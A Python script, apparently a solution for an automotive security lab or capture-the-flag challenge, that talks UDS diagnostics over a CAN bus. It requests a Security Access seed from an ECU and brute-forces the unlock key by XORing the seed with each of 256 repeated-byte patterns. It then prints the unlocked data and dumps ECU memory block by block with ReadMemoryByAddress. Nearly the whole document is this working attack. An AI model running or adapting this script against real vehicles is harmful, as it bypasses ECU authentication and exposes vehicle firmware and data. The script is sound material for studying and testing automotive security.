
import sys
import subprocess
import threading
import can
import time


# --- [CONFIGURATIONS] ---
# 버스 환경 설정 전역 변수
CAN_INTERFACE = 'socketcan'
CAN_CHANNEL = 'vcan0'  # 실제 장치는 'can0', 테스트는 'vcan0'
CAN_BITRATE = 500000

# 메시지 설정
REQ_ID = 0x7DF    # 송신 ID (예: OBD-II Functional Request)
RES_ID = 0x7E8    # 수신 대기할 특정 ID (예: ECU Response)

# --- [MODULES] ---

def setup_can_bus():
    """
    1. CAN 버스 환경 설정 함수
    전역 변수를 참조하여 버스 객체를 생성하고 반환합니다.
    """
    try:
        bus = can.interface.Bus(
            interface=CAN_INTERFACE,
            channel=CAN_CHANNEL,
            bitrate=CAN_BITRATE
        )
        print(f"[INFO] Bus initialized on {CAN_CHANNEL} ({CAN_INTERFACE})")
        return bus
    except Exception as e:
        print(f"[ERROR] Failed to setup bus: {e}")
        return None

def send_can_message(bus, msg_id, payload_str):
    """
    2. CAN 메시지 송신 함수
    payload_str: "02 10 02 00 00 00 00 00" 형태의 문자열
    """
    try:
        # 공백 제거 후 16진수 바이트 리스트로 변환
        data_bytes = [int(byte, 16) for byte in payload_str.split()]
        
        msg = can.Message(
            arbitration_id=msg_id,
            data=data_bytes,
            is_extended_id=False
        )
        
        bus.send(msg)
        #print(f"[TX] ID: {hex(msg_id)} | Data: {payload_str}")
    except ValueError as e:
        print(f"[ERROR] Invalid payload format: {e}")
    except can.CanError as e:
        print(f"[ERROR] Message not sent: {e}")

def receive_response_return_byte(bus, target_id, timeout_ms):
    """
    ISO-TP 지원 및 기존 인덱스 호환성 유지 버전 (Bytes 반환)
    """
    timeout_sec = timeout_ms / 1000.0
    start_time = time.time()
    full_data = bytearray()
    expected_len = 0

    while (time.time() - start_time) < timeout_sec:
        remaining_time = timeout_sec - (time.time() - start_time)
        msg = bus.recv(timeout=max(0, remaining_time))
        
        if msg is not None and msg.arbitration_id == target_id:
            pci = msg.data[0] >> 4

            # 1. Single Frame: 기존처럼 8바이트 전체 반환 (인덱스 유지)
            if pci == 0x00:
                return bytes(msg.data)

            # 2. First Frame
            elif pci == 0x01:
                expected_len = ((msg.data[0] & 0x0F) << 8) | msg.data[1]
                full_data.extend(msg.data[2:])
                bus.send(can.Message(arbitration_id=REQ_ID, data=[0x30, 0x00, 0x00, 0, 0, 0, 0, 0], is_extended_id=False))
                continue

            # 3. Consecutive Frame
            elif pci == 0x02:
                full_data.extend(msg.data[1:])
                if len(full_data) >= expected_len:
                    # 인덱스 [3:] 규칙을 위해 앞에 3바이트 더미(0x00) 추가
                    return bytes([0x00, 0x00, 0x00]) + bytes(full_data[:expected_len])
                    
    return None

def receive_response_return_hex(bus, target_id, timeout_ms):
    timeout_sec = timeout_ms / 1000.0
    start_time = time.time()
    
    full_data = bytearray()
    expected_len = 0

    while (time.time() - start_time) < timeout_sec:
        remaining_time = timeout_sec - (time.time() - start_time)
        msg = bus.recv(timeout=max(0, remaining_time))
        
        if msg is not None and msg.arbitration_id == target_id:
            pci = msg.data[0] >> 4

            # 1. Single Frame (기존 인덱스 체계를 유지하기 위해 전체 8바이트 반환)
            if pci == 0x00:
                return ' '.join([f"{b:02X}" for b in msg.data])

            # 2. First Frame (긴 데이터의 시작)
            elif pci == 0x01:
                expected_len = ((msg.data[0] & 0x0F) << 8) | msg.data[1]
                # FF 응답도 전체 형식을 맞추기 위해 앞에 00 등을 채우거나 
                # 유저님의 체크 로직을 고려하여 데이터만 취합합니다.
                full_data.extend(msg.data[2:])
                
                fc_msg = can.Message(arbitration_id=REQ_ID, data=[0x30, 0x00, 0x00, 0, 0, 0, 0, 0], is_extended_id=False)
                bus.send(fc_msg)
                continue

            # 3. Consecutive Frame
            elif pci == 0x02:
                full_data.extend(msg.data[1:])
                if len(full_data) >= expected_len:
                    # 긴 응답도 기존 체크 로직(인덱스 3번부터 데이터)을 위해 앞에 더미 바이트 추가
                    # "00 00 00 63 ..." 처럼 구성하여 3번 인덱스가 63(긍정응답)이 되게 함
                    final_hex = '00 00 00 ' + ' '.join([f"{b:02X}" for b in full_data[:expected_len]])
                    return final_hex

    return None

def receive_and_print_response(bus, target_id, timeout_ms):
    """
    ISO-TP 지원 및 출력/반환 호환성 유지 버전
    """
    timeout_sec = timeout_ms / 1000.0
    start_time = time.time()
    full_data = bytearray()
    expected_len = 0
    
    while (time.time() - start_time) < timeout_sec:
        remaining_time = timeout_sec - (time.time() - start_time)
        msg = bus.recv(timeout=max(0, remaining_time))
        
        if msg is not None and msg.arbitration_id == target_id:
            pci = msg.data[0] >> 4

            if pci == 0x00:  # Single Frame
                length = msg.data[0] & 0x0F
                actual_data = msg.data[1:1+length]
                print(f"[RX] ID: {hex(target_id)} | Data: {' '.join([f'{b:02X}' for b in actual_data])}")
                # 반환은 기존 인덱스 체크를 위해 8바이트 전체 반환
                return bytes(msg.data)

            elif pci == 0x01:  # First Frame
                expected_len = ((msg.data[0] & 0x0F) << 8) | msg.data[1]
                full_data.extend(msg.data[2:])
                bus.send(can.Message(arbitration_id=REQ_ID, data=[0x30, 0x00, 0x00, 0, 0, 0, 0, 0], is_extended_id=False))
                continue

            elif pci == 0x02:  # Consecutive Frame
                full_data.extend(msg.data[1:])
                if len(full_data) >= expected_len:
                    final_payload = bytes(full_data[:expected_len])
                    print(f"[RX-LONG] ID: {hex(target_id)} | Total: {expected_len} bytes")
                    print(f"[DATA] {' '.join([f'{b:02X}' for b in final_payload])}")
                    # 반환은 인덱스 [3:] 규칙 보존을 위해 더미 포함
                    return bytes([0x00, 0x00, 0x00]) + final_payload
                    
    return None

def print_as_ascii(data):
    """
    bytes 자료형을 입력받아 ASCII 문자열로 변환하여 출력하는 함수.
    출력 불가능한 바이트는 '.'으로 대체하여 에러를 방지합니다.
    """
    if not data:
        print("[ASCII] No data to decode.")
        return None

    # 방법 1: decode() 사용 (가장 표준적인 방법)
    # 'replace' 옵션을 주면 디코딩 불가능한 바이트를  등으로 대체해줍니다.
    try:
        # CAN 데이터 특성상 0x00(Null)이나 0x01 같은 제어 문자가 많으므로
        # printable한 문자만 남기는 처리가 실무에서 유용합니다.
        ascii_str = "".join([chr(b) if 32 <= b <= 126 else "." for b in data])
        
        print(f"[ASCII] Decoded: \"{ascii_str}\"")
        return ascii_str
    except Exception as e:
        print(f"[ERROR] ASCII conversion failed: {e}")
        return None

# --- 활용 예시 ---
# received_data = receive_and_print_response(can_bus, 0x7E8, 500)
# if received_data:
#     print_as_ascii(received_data)

def invert_data(input):
    segment = input[3:5]
    inverted_list = [(~b & 0xFF) for b in segment]
    result_hex = ' '.join([f'{b:02X}' for b in inverted_list])
    return result_hex

class SessionKeeper:
    def __init__(self, bus):
        self.bus = bus
        self.stop_event = threading.Event()
        self.thread = None

    def _run(self):
        """내부적으로 2초마다 Tester Present 전송 (일반적으로 T3server 타임아웃 고려)"""
        print("[Thread] Tester Present 시작")
        while not self.stop_event.is_set():
            # 01 3E 80 (Suppress Response 사용 추천)
            msg = can.Message(arbitration_id=REQ_ID, data=[0x02, 0x3E, 0x80, 0, 0, 0, 0, 0], is_extended_id=False)
            try:
                self.bus.send(msg)
            except Exception as e:
                print(f"[Thread Error] {e}")
            
            # stop_event가 set될 때까지 2초 대기 (중간에 종료 신호 오면 즉시 깨어남)
            self.stop_event.wait(2.0) 
        print("[Thread] Tester Present 중단")

    def start(self):
        self.stop_event.clear()
        self.thread = threading.Thread(target=self._run)
        self.thread.daemon = True  # 메인 스레드 종료 시 함께 종료
        self.thread.start()

    def stop(self):
        self.stop_event.set()
        if self.thread:
            self.thread.join()


def singleByteTransform(source, byteLen):
    ret = 0
    for i in range(byteLen):
        ret = (ret << 8) | source  # 비트 시프트 후 더하기
    return ret





#############################################################################
def exe_rmba(addr_byte):
    addr_hex = addr_byte.hex(' ').upper()
    send_can_message(bus, REQ_ID, f"07 23 14 {addr_hex} FF")
    print(f"rmba req sent! (address : {addr_hex})")

    rmba_res = receive_response_return_byte(bus, RES_ID, 200)
    rmba_res_hex = rmba_res.hex(' ').upper()
    print(f'response = {rmba_res_hex}')


    user_ans = input("1. go / else. stop")
    return user_ans



if __name__ == "__main__":
    bus = setup_can_bus()
    print("program starts")

    send_can_message(bus, REQ_ID, "02 27 01 00 00 00 00 00")
    print("requested seed for lv 1")

    res_01 = receive_response_return_byte(bus, RES_ID, 200)
    
    if res_01:
        if res_01[1] == 0x67: #positive + single frame
            res_01_byte = res_01
            res_01_hex = res_01.hex(' ').upper()
            seed_byte = res_01_byte[3:7]
            seed_hex = seed_byte.hex(' ').upper()
            print("Got Seed Successfully_by single frame")
            print(f'Response for Requesting Seed : \"{res_01_hex}\"')
            print(f'seed : \"{seed_hex}\"')
        elif res_01[0] == 0x00 and res_01[3] == 0x67:
            res_01_byte = res_01
            res_01_hex = res_01.hex(' ').upper()
            seed_byte = res_01_byte[5:9]
            seed_hex = seed_byte.hex(' ').upper()
            print("Got Seed Successfully_by single frame")
            print(f'Response for Requesting Seed : \"{res_01_hex}\"')
            print(f'seed : \"{seed_hex}\"')
        else:
            print("what kind of frame did i get?")
        
    if res_01_byte:
        for i in range(0x00, 0x100):
            cipher = singleByteTransform(i, 4)
            
            seed_int = int.from_bytes(seed_byte, byteorder='big')
            
            xor_ret_int = seed_int ^ cipher

            xor_ret_byte = xor_ret_int.to_bytes(4, byteorder='big')
            xor_ret_hex = xor_ret_byte.hex(' ').upper()

            send_can_message(bus, REQ_ID, f'07 27 02 {xor_ret_hex} 00')
            
            saRet = receive_response_return_byte(bus, RES_ID, 200)

            if saRet:
                if saRet[1] == 0x67:
                    #sa unlock 성공 + single frame
                    sa1_flag = 1
                    data = saRet[3:]
                    data_hex = data.hex(' ').upper()
                    print("sa lv 1 unlock succedded")
                    print(f'data : {data_hex}')
                    data_ascii = print_as_ascii(data)
                    break

                elif saRet[0] == 0x00 and saRet[3] == 0x67:
                    # sa unlock 성공 + CF
                    sa1_flag = 1
                    data = saRet[5:]
                    data_hex = data.hex(' ').upper()
                    print("sa lv 1 unlock succedded")
                    print(f'data : {data_hex}')
                    data_ascii = print_as_ascii(data)
                    break

            else: # 메세지 응답 없음
                print("no message from ECU")
                sa1_flag = 0

    start_addr_int = 3237994496
    start_addr_byte = start_addr_int.to_bytes(4, byteorder='big')
    start_addr_hex = start_addr_byte.hex(' ').upper()

    if sa1_flag == 1:
        addr_int = start_addr_int
        addr_byte = addr_int.to_bytes(4, byteorder='big')
        while True:
            user_decision = exe_rmba(addr_byte)
            if user_decision == "1":
                addr_int = addr_int + 0xFF
                addr_byte = addr_int.to_bytes(4, byteorder='big')
                continue
            else:
                break


            


    else:
        print("Negative response for Requesting Seed")
        exit()
    